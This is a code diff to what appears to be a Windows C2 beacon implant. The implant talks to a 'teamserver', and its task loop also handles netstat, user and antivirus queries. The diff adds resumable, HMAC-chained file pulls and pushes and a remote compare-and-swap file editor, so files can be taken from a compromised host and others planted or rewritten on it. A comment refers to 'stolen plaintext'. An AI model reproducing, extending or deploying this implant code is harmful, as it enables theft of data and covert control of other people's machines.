@@ -41,6 +41,7 @@
 #include <psapi.h>
 #include <iphlpapi.h>
 #include <objidl.h>
+#include <bcrypt.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -56,6 +57,7 @@
 #define WIDEN(x) WIDEN2(x)
 #define CBEACON_UA_W WIDEN(CBEACON_UA)
 
+#pragma comment(lib, "bcrypt.lib")
 #pragma comment(lib, "winhttp.lib")
 #pragma comment(lib, "sqlite3.lib")
 
@@ -542,6 +544,11 @@ typedef struct {
     long long size;
     char *prev_mac;
     char *mac;
+    /* Durable transfer + CAS edit fields. */
+    char *direction;
+    long long transfer_id;
+    int final;
+    char *expected_sha256;
 } ctask_t;
 
 /* Decrypt one base64(nonce12||ct||tag16) field with the session key.
@@ -616,6 +623,8 @@ static void free_task(ctask_t *t) {
     if (t->data) free(t->data);
     if (t->prev_mac) free(t->prev_mac);
     if (t->mac) free(t->mac);
+    if (t->direction) free(t->direction);
+    if (t->expected_sha256) free(t->expected_sha256);
     memset(t, 0, sizeof(*t));
 }
 
@@ -624,6 +633,13 @@ static void free_task(ctask_t *t) {
  * link = HMAC(chainKey, prev || data), hex-encoded on the wire. */
 #define CHAIN_SLOTS 32
 static void hex_encode(const BYTE *in, size_t len, char *out);
+static const char *base_name(const char *p);
+static char *emit_file_result_ex(unsigned long long id, const char *type,
+                                 const char *b64out, const char *rid,
+                                 const char *filename, const char *path,
+                                 long long offset, long long size,
+                                 const char *machex, int final,
+                                 const char *shahex);
 static BYTE g_chainkey[32];
 static int g_chainkey_ok = 0;
 static struct { unsigned long long id; BYTE prev[32]; int used; } g_chains[CHAIN_SLOTS];
@@ -713,6 +729,24 @@ static int chain_download_link(unsigned long long id, const BYTE *data,
     if (chain_hmac(prev, data, datalen, mac) != 0) return -1;
     chain_commit(id, mac);
     hex_encode(mac, 32, hexout);
+    cng_wipe(mac, 32);
+    return 0;
+}
+
+/* Durable transfers seed every link from the session PrevMAC carried in the
+ * task, so a restarted agent/teamserver never loses chain continuity. */
+static int chain_link_from_prev(const char *prev_hex, const BYTE *data,
+                                DWORD datalen, char hexout[65]) {
+    BYTE prev[32], mac[32];
+    if (chain_key() != 0) return -1;
+    if (prev_hex && prev_hex[0]) {
+        if (hex_to32(prev_hex, prev) != 0) return -1;
+    } else {
+        memset(prev, 0, 32);
+    }
+    if (chain_hmac(prev, data, datalen, mac) != 0) return -1;
+    hex_encode(mac, 32, hexout);
+    cng_wipe(prev, 32);
     cng_wipe(mac, 32);
     return 0;
 }
@@ -821,6 +855,13 @@ static const char *parse_task(const char *p, ctask_t *t) {
             if (jstring(obj, "prev_mac", pm, sizeof(pm))) t->prev_mac = _strdup(pm);
             if (jstring(obj, "mac", em, sizeof(em))) t->mac = _strdup(em);
         }
+        {
+            char dir[32] = {0}, exp[80] = {0};
+            if (jstring(obj, "direction", dir, sizeof(dir))) t->direction = _strdup(dir);
+            if (jstring(obj, "expected_sha256", exp, sizeof(exp))) t->expected_sha256 = _strdup(exp);
+            t->transfer_id = (long long)ju64(obj, "transfer_id");
+            t->final = jbool(obj, "final");
+        }
         if (cmd) free(cmd);
         if (sh) free(sh);
         if (pa) free(pa);
@@ -903,17 +944,33 @@ static char *make_rid(void) {
     return rid;
 }
 
-/* Emit one result object (malloc'd). b64out must already be base64 text. */
-static char *emit_b64_result(unsigned long long id, const char *type,
-                             const char *b64out, const char *rid) {
-    size_t need = strlen(b64out) + strlen(type) + 128;
+/* Result emitter carrying CAS/transfer metadata. Empty sha suppresses the
+ * optional fields so legacy results keep their exact previous shape. */
+static char *emit_b64_result_ex(unsigned long long id, const char *type,
+                                const char *b64out, const char *rid,
+                                int final, const char *shahex, long long mtime) {
+    int have_meta = (shahex && shahex[0]) || mtime > 0 || final;
+    size_t need = strlen(b64out) + strlen(type) + 256;
     char *o = (char *)malloc(need);
     if (!o) return NULL;
-    _snprintf(o, need,
-        "{\"task_id\":%llu,\"type\":\"%s\",\"output\":\"%s\","
-        "\"encoding\":\"base64\",\"rid\":\"%s\"}",
-        id, type, b64out, rid ? rid : "");
+    if (have_meta) {
+        _snprintf(o, need,
+            "{\"task_id\":%llu,\"type\":\"%s\",\"output\":\"%s\","
+            "\"encoding\":\"base64\",\"rid\":\"%s\",\"final\":%s,"
+            "\"sha256\":\"%s\",\"mtime\":%lld}",
+            id, type, b64out, rid ? rid : "", final ? "true" : "false",
+            shahex ? shahex : "", mtime);
+    } else {
+        _snprintf(o, need,
+            "{\"task_id\":%llu,\"type\":\"%s\",\"output\":\"%s\","
+            "\"encoding\":\"base64\",\"rid\":\"%s\"}",
+            id, type, b64out, rid ? rid : "");
+    }
     return o;
+}
+static char *emit_b64_result(unsigned long long id, const char *type,
+                             const char *b64out, const char *rid) {
+    return emit_b64_result_ex(id, type, b64out, rid, 0, NULL, 0);
 }
 
 static char *emit_text_result(unsigned long long id, const char *type,
@@ -1588,6 +1645,175 @@ static BYTE *do_read_chunk(const char *path, long long offset, long long size,
     return buf;
 }
 
+#define TRANSFER_CHUNK_SIZE (2u * 1024u * 1024u)
+
+/* Durable push: write raw bytes at an explicit offset, truncating at zero. */
+static int do_write_chunk_at(const char *path, long long offset,
+                             const BYTE *data, DWORD datalen) {
+    HANDLE h;
+    LARGE_INTEGER li;
+    DWORD wr = 0;
+    if (!path_is_safe(path)) return -1;
+    if (offset <= 0)
+        h = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
+                        FILE_ATTRIBUTE_NORMAL, NULL);
+    else
+        h = CreateFileA(path, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS,
+                        FILE_ATTRIBUTE_NORMAL, NULL);
+    if (h == INVALID_HANDLE_VALUE) return -1;
+    if (offset > 0) {
+        li.QuadPart = offset;
+        if (!SetFilePointerEx(h, li, NULL, FILE_BEGIN)) {
+            CloseHandle(h); return -1;
+        }
+    }
+    if (datalen && (!WriteFile(h, data, datalen, &wr, NULL) || wr != datalen)) {
+        CloseHandle(h); return -1;
+    }
+    if (!FlushFileBuffers(h)) { CloseHandle(h); return -1; }
+    CloseHandle(h);
+    return 0;
+}
+
+/* Size of an existing file, used to detect EOF on unknown-size pulls. */
+static int file_size_ex(const char *path, long long *out) {
+    HANDLE h;
+    LARGE_INTEGER li;
+    if (!path || !path[0] || !out) return -1;
+    h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
+                    NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (h == INVALID_HANDLE_VALUE) return -1;
+    if (!GetFileSizeEx(h, &li)) { CloseHandle(h); return -1; }
+    CloseHandle(h);
+    *out = li.QuadPart;
+    return 0;
+}
+
+/* Durable transfers use the explicit direction from the task; an empty Data
+ * field never flips a pull into a push (or vice versa). */
+static char *do_transfer_task(const ctask_t *t, const char *rid) {
+    const char *pp = (t->path && t->path[0]) ? t->path : t->command;
+    if (!pp || !pp[0])
+        return emit_error_result(t->id, t->type, "path required", rid);
+
+    if (strcmp(t->direction, "pull") == 0) {
+        long long size = t->size > 0 ? t->size : (long long)TRANSFER_CHUNK_SIZE;
+        DWORD rlen = 0;
+        long long roff = 0, fsz = -1;
+        BYTE *data, sh[32];
+        char *b64, mh[65] = {0}, shx[65] = {0}, *o;
+        int final = t->final;
+        if (size > 4 * 1024 * 1024) size = 4 * 1024 * 1024;
+        data = do_read_chunk(pp, t->offset, size, &rlen, &roff);
+        if (!data) return emit_error_result(t->id, "download", "cannot open file", rid);
+        b64 = b64enc(data, rlen);
+        o = NULL;
+        if (b64) {
+            if (chain_link_from_prev(t->prev_mac, data, rlen, mh) != 0) mh[0] = '\0';
+            if (cng_sha256(data, rlen, sh) == 0) hex_encode(sh, 32, shx);
+            if (!final) {
+                if (file_size_ex(pp, &fsz) == 0 && roff + (long long)rlen >= fsz)
+                    final = 1;
+                else if (rlen < (DWORD)size)
+                    final = 1; /* short read = EOF on unknown-size sessions */
+            }
+            o = emit_file_result_ex(t->id, "download", b64, rid, base_name(pp), pp,
+                                    roff, (long long)rlen, mh, final, shx);
+            free(b64);
+        }
+        cng_wipe(data, rlen);
+        free(data);
+        return o ? o : emit_error_result(t->id, "download", "chunk failed", rid);
+    }
+
+    if (strcmp(t->direction, "push") == 0) {
+        const char *b64 = (t->data && t->data[0]) ? t->data : t->shell;
+        DWORD blen = 0;
+        BYTE *raw = b64dec(b64 ? b64 : "", &blen);
+        BYTE sh[32];
+        char shx[65] = {0}, machex[65] = {0};
+        char *o;
+        if (!raw) return emit_error_result(t->id, "upload", "upload: bad base64", rid);
+        if (blen > TRANSFER_CHUNK_SIZE) {
+            cng_wipe(raw, blen); free(raw);
+            return emit_error_result(t->id, "upload", "chunk too large", rid);
+        }
+        if (chain_verify_upload(t->id, raw, blen, t->prev_mac, t->mac) != 0) {
+            cng_wipe(raw, blen); free(raw);
+            return emit_error_result(t->id, "upload", "chunk HMAC mismatch (tampered/reordered data)", rid);
+        }
+        if (do_write_chunk_at(pp, t->offset, raw, blen) != 0) {
+            cng_wipe(raw, blen); free(raw);
+            return emit_error_result(t->id, "upload", "cannot write file", rid);
+        }
+        if (cng_sha256(raw, blen, sh) == 0) hex_encode(sh, 32, shx);
+        /* Recompute the acknowledged link from the same session prev used by
+         * chain_verify_upload; never rely on a per-task cached chain slot. */
+        chain_link_from_prev(t->prev_mac, raw, blen, machex);
+        /* The server recomputes the pushed file digest from echoed bytes. */
+        o = emit_file_result_ex(t->id, "upload", b64 ? b64 : "", rid,
+                                base_name(pp), pp, t->offset, (long long)blen,
+                                machex, t->final, shx);
+        cng_wipe(raw, blen);
+        free(raw);
+        return o ? o : emit_error_result(t->id, "upload", "chunk failed", rid);
+    }
+    return emit_error_result(t->id, t->type, "unsupported transfer direction", rid);
+}
+
+/* Remote text editor: compare-and-swap write of an existing UTF-8 file.
+ * The task carries only the baseline digest, never a stolen plaintext. */
+static char *do_write_task(const ctask_t *t, const char *rid) {
+    const char *pp = (t->path && t->path[0]) ? t->path : t->command;
+    DWORD blen = 0;
+    BYTE *raw, expected[32], sh[32];
+    char shx[65] = {0}, errbuf[256] = {0}, *b64;
+    long long mt = 0;
+    int rc;
+    if (!pp || !pp[0] || !t->expected_sha256 || !t->expected_sha256[0])
+        return emit_error_result(t->id, "write", "write: path and expected_sha256 required", rid);
+    if (hex_to32(t->expected_sha256, expected) != 0)
+        return emit_error_result(t->id, "write", "expected_sha256 must be 64 hex characters", rid);
+    raw = b64dec(t->data ? t->data : "", &blen);
+    if (!raw) return emit_error_result(t->id, "write", "write: bad base64", rid);
+    if (blen > 1024u * 1024u) {
+        cng_wipe(raw, blen); free(raw);
+        return emit_error_result(t->id, "write", "file too large", rid);
+    }
+    if (t->mac && t->mac[0]) {
+        BYTE prev[32], mac[32], want[32];
+        memset(prev, 0, 32);
+        if (t->prev_mac && t->prev_mac[0] && hex_to32(t->prev_mac, prev) != 0)
+            memset(prev, 0, 32);
+        if (chain_key() != 0 || chain_hmac(prev, raw, blen, mac) != 0 ||
+            hex_to32(t->mac, want) != 0 || memcmp(mac, want, 32) != 0) {
+            cng_wipe(raw, blen); free(raw);
+            cng_wipe(prev, 32); cng_wipe(mac, 32); cng_wipe(want, 32);
+            return emit_error_result(t->id, "write", "chunk HMAC mismatch (tampered/reordered data)", rid);
+        }
+        cng_wipe(prev, 32); cng_wipe(mac, 32); cng_wipe(want, 32);
+    }
+    rc = cng_cas_write_file(pp, raw, blen, expected, sh, &mt, errbuf, sizeof(errbuf));
+    if (rc == 1) {
+        cng_wipe(raw, blen); free(raw);
+        return emit_error_result(t->id, "write", "file_conflict", rid);
+    }
+    if (rc != 0) {
+        char msg[320];
+        _snprintf(msg, sizeof(msg), "write failed: %s", errbuf[0] ? errbuf : "unknown error");
+        cng_wipe(raw, blen); free(raw);
+        return emit_error_result(t->id, "write", msg, rid);
+    }
+    hex_encode(sh, 32, shx);
+    b64 = b64enc(raw, blen);
+    {
+        char *o = b64 ? emit_b64_result_ex(t->id, "write", b64, rid, 0, shx, mt) : NULL;
+        free(b64);
+        cng_wipe(raw, blen); free(raw);
+        return o ? o : emit_error_result(t->id, "write", "result encode failed", rid);
+    }
+}
+
 /* mkdir -p (mirrors Go os.MkdirAll): create each component, ignore already-exists. */
 static int do_mkdir_all(const char *path) {
     char buf[MAX_PATH * 2];
@@ -1677,6 +1903,36 @@ static char *emit_file_result(unsigned long long id, const char *type,
             "\"path\":\"%s\",\"offset\":%lld,\"size\":%lld,\"mac\":\"%s\"}",
             id, type, b64out, rid ? rid : "", fesc, pesc,
             offset, size, machex ? machex : "");
+    }
+    free(fesc);
+    free(pesc);
+    return o;
+}
+
+/* Durable pull result: same file fields plus final and the chunk digest that
+ * the server cross-checks before advancing the committed offset. */
+static char *emit_file_result_ex(unsigned long long id, const char *type,
+                                 const char *b64out, const char *rid,
+                                 const char *filename, const char *path,
+                                 long long offset, long long size,
+                                 const char *machex, int final,
+                                 const char *shahex) {
+    char *fesc = jescape(filename ? filename : "", strlen(filename ? filename : ""));
+    char *pesc = jescape(path ? path : "", strlen(path ? path : ""));
+    char *o;
+    size_t need;
+    if (!fesc || !pesc) { free(fesc); free(pesc); return NULL; }
+    need = strlen(b64out) + strlen(type) + strlen(fesc) + strlen(pesc) + 320;
+    o = (char *)malloc(need);
+    if (o) {
+        _snprintf(o, need,
+            "{\"task_id\":%llu,\"type\":\"%s\",\"output\":\"%s\","
+            "\"encoding\":\"base64\",\"rid\":\"%s\",\"filename\":\"%s\","
+            "\"path\":\"%s\",\"offset\":%lld,\"size\":%lld,\"mac\":\"%s\","
+            "\"final\":%s,\"sha256\":\"%s\"}",
+            id, type, b64out, rid ? rid : "", fesc, pesc,
+            offset, size, machex ? machex : "", final ? "true" : "false",
+            shahex ? shahex : "");
     }
     free(fesc);
     free(pesc);
@@ -3972,7 +4228,12 @@ int main(void) {
                                                 BYTE *data = do_read_file(pp, &rlen);
                                                 if (data) {
                                                     char *b64 = b64enc(data, rlen);
-                                                    robj = b64 ? emit_b64_result(t.id, "read", b64, rid) : NULL;
+                                                    BYTE sh[32];
+                                                    char shx[65] = {0};
+                                                    long long mt = 0;
+                                                    if (cng_sha256(data, rlen, sh) == 0) hex_encode(sh, 32, shx);
+                                                    cng_file_mtime(pp, &mt);
+                                                    robj = b64 ? emit_b64_result_ex(t.id, "read", b64, rid, 0, shx, mt) : NULL;
                                                     free(b64);
                                                     cng_wipe(data, rlen);
                                                     free(data);
@@ -4014,7 +4275,9 @@ int main(void) {
                                                 kill_now = 1;
                                             } else if (strcmp(t.type, "download") == 0) {
                                                 const char *pp = (t.path && t.path[0]) ? t.path : t.command;
-                                                if (pp && (_strnicmp(pp, "http://", 7) == 0 || _strnicmp(pp, "https://", 8) == 0)) {
+                                                if (t.transfer_id > 0 && t.direction && t.direction[0]) {
+                                                    robj = do_transfer_task(&t, rid);
+                                                } else if (pp && (_strnicmp(pp, "http://", 7) == 0 || _strnicmp(pp, "https://", 8) == 0)) {
                                                     robj = emit_error_result(t.id, "download", "use download_url for URLs", rid);
                                                 } else if (!pp || !pp[0]) {
                                                     robj = emit_error_result(t.id, "download", "path required", rid);
@@ -4064,7 +4327,9 @@ int main(void) {
                                             } else if (strcmp(t.type, "upload") == 0) {
                                                 const char *pp = (t.path && t.path[0]) ? t.path : t.command;
                                                 const char *b64 = (t.data && t.data[0]) ? t.data : t.shell;
-                                                if (!pp || !pp[0] || !b64 || !b64[0]) {
+                                                if (t.transfer_id > 0 && t.direction && t.direction[0]) {
+                                                    robj = do_transfer_task(&t, rid);
+                                                } else if (!pp || !pp[0] || !b64 || !b64[0]) {
                                                     robj = emit_error_result(t.id, "upload", "upload: path and data required", rid);
                                                 } else if (!path_is_safe(pp)) {
                                                     robj = emit_error_result(t.id, "upload", "path traversal rejected", rid);
@@ -4102,6 +4367,8 @@ int main(void) {
                                                         free(raw);
                                                     }
                                                 }
+                                                                                        } else if (strcmp(t.type, "write") == 0) {
+                                                robj = do_write_task(&t, rid);
                                                                                         } else if (strcmp(t.type, "netstat") == 0 || strcmp(t.type, "users") == 0 || strcmp(t.type, "av") == 0) {
                                                 DWORD olen = 0;
                                                 char *out = NULL;
